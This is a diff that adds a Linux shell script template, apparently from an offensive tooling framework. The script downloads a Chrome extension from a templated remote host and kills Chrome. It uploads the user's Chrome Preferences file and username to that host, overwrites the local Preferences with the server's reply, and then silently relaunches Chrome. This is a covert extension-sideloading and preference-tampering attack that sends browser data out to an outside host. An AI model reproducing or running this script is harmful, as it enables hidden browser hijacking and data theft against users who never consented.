@@ -1,0 +1,40 @@
+hostname="#HOSTNAME#"
+extension="#EXTENSION_NAME#"
+extension_path="$HOME/#EXTENSION_PATH#"
+os="linux"
+
+chrome="chrome"
+
+# Check if Chrome is installed
+if [ -d "/opt/google/chrome" ]; then
+
+    # Change to extension directory
+    cd "$extension_path"
+
+    # Download Extension
+    zipfile="$extension.zip"
+    rm -f $zipfile
+    wget -q#CERT_CHECK# https://$hostname/download/extension/$zipfile -O $zipfile
+    unzip -o -qq $zipfile
+    rm -f $zipfile
+
+    # Kill Google Chrome
+    killall -q chrome
+    sleep 1
+
+    # Update Secure Preferences File
+    cd
+    sid=""
+    pf="$extension_path/Preferences"
+    echo $(wget -q#CERT_CHECK# \
+        --method=POST \
+        --body-file="$pf" \
+        -O - \
+        --header="Content-Type: application/octet-stream" \
+        "https://$hostname/upload/?extension=$extension&os=$os&sid=$sid&user=$USER") > "$pf"
+
+    # Open Google Chrome
+    sleep 1
+    /opt/google/chrome/$chrome --args --restore-last-session --noerrdialogs &> /dev/null &
+
+fi
